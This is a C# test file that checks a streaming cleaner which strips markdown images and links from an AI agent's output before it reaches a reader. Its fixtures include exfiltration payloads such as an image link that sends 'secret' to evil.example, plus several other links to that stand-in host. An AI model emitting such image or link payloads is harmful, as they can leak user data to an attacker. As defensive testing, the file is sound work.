namespace AbpAgent.Tests;

public class AgentTextStreamTests
{
    /// <summary>The text fed in pieces of <paramref name="size"/>, as a model writes it: every piece given, then the rest.</summary>
    private static List<string> Streamed(string text, int size)
    {
        AgentTextStream stream = new();
        List<string> given = [];
        for (int at = 0; at < text.Length; at += size)
        {
            given.AddRange(stream.Append(text.Substring(at, Math.Min(size, text.Length - at))));
        }

        given.Add(stream.Flush());
        return [.. given.Where(p => p.Length > 0)];
    }

    [Theory]
    [InlineData(1)]
    [InlineData(3)]
    [InlineData(64)]
    public void An_image_or_a_link_never_reaches_a_reader_and_what_is_given_cleans_to_itself(int size)
    {
        const string text = "First paragraph.\n\n![leak](https://evil.example/x?d=secret)\n\nA [link](https://evil.example) here.\n\n"
            + "- one\n- two [x](https://evil.example/2)\n\n| a | b |\n|---|---|\n| ![i](https://evil.example/3) | c |\n";
        List<string> given = Streamed(text, size);
        string joined = string.Concat(given);

        Assert.True(given.Count > 3); // given as it came, a block at a time
        Assert.DoesNotContain(given, p => p.Contains("![leak](", StringComparison.Ordinal) || p.Contains("](https://", StringComparison.Ordinal));
        Assert.Equal(joined, AgentText.Clean(joined));
        Assert.Contains("evil.example/x", joined, StringComparison.Ordinal); // its address shown as text
    }

    [Fact]
    public void A_line_that_only_looks_like_a_list_item_is_held_back_until_no_link_can_be_made_across_it()
    {
        // "2." can't start a list inside a paragraph: it's the paragraph's next line, so the link spans both lines.
        const string text = "Some [text\n2. more](https://evil.example/x) end.\n\nAfter.\n";
        List<string> given = Streamed(text, 2);
        string joined = string.Concat(given);

        Assert.Equal(joined, AgentText.Clean(joined));
        Assert.DoesNotContain("](https://", joined, StringComparison.Ordinal);
        foreach (int end in Enumerable.Range(1, given.Count))
        {
            string prefix = string.Concat(given.Take(end));
            Assert.Equal(prefix, AgentText.Clean(prefix)); // safe at every moment, not only at the end
        }
    }

    [Theory]
    [InlineData("- two [x](https://evil.example/2)\n")]
    [InlineData("1. two [X](https://evil.example/2)\n")]
    [InlineData("- [ ](https://evil.example/2)\n")]
    [InlineData("- one\n- two [x](https://evil.example/2)\n")]
    public void A_link_whose_text_looks_like_a_checkbox_is_cleaned_in_a_list_too(string text)
    {
        // A browser reads "[x](address)" in a list item as a link, so the cleaner must see one there too.
        string cleaned = AgentText.Clean(text);

        Assert.DoesNotContain("](https://", cleaned, StringComparison.Ordinal);
        Assert.Contains("(https://evil.example/2)", cleaned, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData(1)]
    [InlineData(5)]
    public void A_long_paragraph_is_given_a_sentence_at_a_time_and_a_link_across_a_sentence_still_never_shows(int size)
    {
        const string plain = "The printer jams on the second page. It does so only with the thick paper. The thin paper goes through.\n\n";
        List<string> given = Streamed(plain, size);
        Assert.True(given.Count >= 2, string.Join(" | ", given)); // the first two sentences together (the first is short), then the last
        Assert.Equal(plain, string.Concat(given));

        const string across = "The printer jams on the second page, so [read this. Then click](https://evil.example/x) now. And more after it.\n\nNext.\n";
        List<string> pieces = Streamed(across, size);
        string joined = string.Concat(pieces);
        Assert.Equal(joined, AgentText.Clean(joined));
        Assert.DoesNotContain("](https://", joined, StringComparison.Ordinal);
        foreach (int end in Enumerable.Range(1, pieces.Count))
        {
            string prefix = string.Concat(pieces.Take(end));
            Assert.Equal(prefix, AgentText.Clean(prefix));
        }
    }

    [Fact]
    public void A_fenced_code_block_is_given_whole_with_its_blank_lines()
    {
        List<string> given = Streamed("Before.\n\n```\nvar a = 1;\n\nvar b = 2;\n```\nAfter.\n", 5);

        Assert.Contains("```\nvar a = 1;\n\nvar b = 2;\n```\n", given);
        Assert.Equal("Before.\n\n```\nvar a = 1;\n\nvar b = 2;\n```\nAfter.\n", string.Concat(given));
    }

    [Fact]
    public void Headings_table_rows_and_list_items_are_given_as_each_ends()
    {
        List<string> given = Streamed("# Title\n| a | b |\n|---|---|\n- one\n- two\n", 4);

        Assert.Equal(["# Title\n", "| a | b |\n", "|---|---|\n", "- one\n", "- two\n"], given);
    }
}
